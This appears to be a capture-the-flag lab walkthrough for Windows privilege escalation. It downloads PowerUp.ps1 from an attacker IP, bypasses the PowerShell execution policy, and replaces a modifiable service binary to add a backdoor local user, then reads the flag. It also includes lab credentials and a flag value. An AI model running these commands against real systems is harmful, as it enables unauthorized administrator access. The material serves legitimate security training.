@@ -1,0 +1,48 @@
+Questions 2 
+Connect to CLIENTWK221 (VM #2) via RDP as user milena with the password MyBirthDayIsInJuly1!. Find a service in which milena can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
+
+HINT
+Import PowerUp.ps1 to identify a service to modify.
+Replace the service's executable by renaming with a malicious binary.
+Restart the service to trigger the malicious binary and gain shell access.
+The flag is on roy user's desktop.
+
+xfreerdp /u:milena /p:MyBirthDayIsInJuly1! /v:192.168.178.221
+
+# Open powershell 
+# Lets identify the ModifiablePath using Powerup.ps1
+PS C:\Users\milena> iwr -uri http://192.168.45.207/PowerUp.ps1 -Outfile PowerUp.ps1
+PS C:\Users\milena> powershell -ep bypass
+PS C:\Users\milena> . .\PowerUp.ps1
+PS C:\Users\milena> Get-ModifiableServiceFile
+...
+ServiceName       : BackupMonitor
+ModifiableFile    : C:\BackupMonitor\BackupMonitor.exe
+StartName         : .\roy
+AbuseFunction     : Install-ServiceBinary -Name 'BackupMonitor'
+CanRestart        : True
+...
+PS C:\Users\milena> install-servicebinary -Name 'BackupMonitor'
+Set-Content : The process cannot access the file 'C:\BackupMonitor\BackupMonitor.exe' because it is being used by
+another process.
+
+# We identify that the service is running so we cannot exploit 
+PS C:\Users\milena> Stop-Service BackupMonitor
+PS C:\Users\milena> install-servicebinary -Name 'BackupMonitor'
+BackupMonitor C:\BackupMonitor\BackupMonitor.exe net user john Password123! /add && timeout /t 5 && net localgroup A...
+
+# Now we can start the service again
+PS C:\Users\milena> start-service BackupMonitor
+start-service : Failed to start service 'BackupMonitor (BackupMonitor)'.
+
+# Service had failed to start, let check is our code exploit successfully
+PS C:\Users\milena> net user
+...
+john
+...
+
+# Change to john user
+start-process PowerShell -verb runas
+PS C:\Users\roy\Desktop> type flag.txt
+OS{48a02a9d3a7d3c0daabc11af1af8f475}
+
